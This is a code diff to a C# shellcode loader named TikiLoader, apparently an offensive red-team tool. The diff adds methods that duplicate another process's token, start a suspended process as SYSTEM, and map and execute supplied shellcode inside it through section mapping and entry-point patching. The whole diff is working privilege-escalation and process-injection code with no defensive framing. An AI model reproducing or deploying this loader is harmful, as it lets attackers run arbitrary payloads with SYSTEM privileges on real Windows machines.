@@ -265,6 +265,28 @@ namespace TikiLoader
 
         }
 
+        public PROCESS_INFORMATION StartProcessAsSystem(string binary, int duplicatePid)
+        {
+            IntPtr hProcess = OpenProcess(0x00001000, false, duplicatePid);
+
+            IntPtr hToken = IntPtr.Zero;
+            OpenProcessToken(hProcess, 0x02000000, ref hToken);
+
+            IntPtr hNewToken = IntPtr.Zero;
+            SECURITY_ATTRIBUTES secAttribs = new SECURITY_ATTRIBUTES();
+            DuplicateTokenEx(hToken, 0xf01ff, ref secAttribs, 2, 1, ref hNewToken);
+
+            STARTUPINFO sInfo = new STARTUPINFO();
+            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
+
+            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
+            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
+
+            CreateProcessAsUser(hNewToken, binary, "", ref pSec, ref tSec, false, CreationFlags.CREATE_SUSPENDED, IntPtr.Zero, @"C:\Windows\System32", ref sInfo, out pInfo);
+
+            return pInfo;
+        }
+
         const ulong PatchSize = 0x10;
 
         public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
@@ -465,6 +487,21 @@ namespace TikiLoader
             CloseHandle(pinf.hThread);
             CloseHandle(pinf.hProcess);
 
+        }
+
+        public void LoadAsSystem(string binary, byte[] shellcode, int impersonationPid)
+        {
+            var pinf = StartProcessAsSystem(binary, impersonationPid);
+            FindEntry(pinf.hProcess);
+
+            if (!CreateSection((uint)shellcode.Length))
+                throw new SystemException("[x] Failed to create new section!");
+
+            SetLocalSection((uint)shellcode.Length);
+            CopyShellcode(shellcode);
+            MapAndStart(pinf);
+            CloseHandle(pinf.hThread);
+            CloseHandle(pinf.hProcess);
         }
 
         public void LoadElevated(string binary, byte[] shellcode, int elevatedPid)
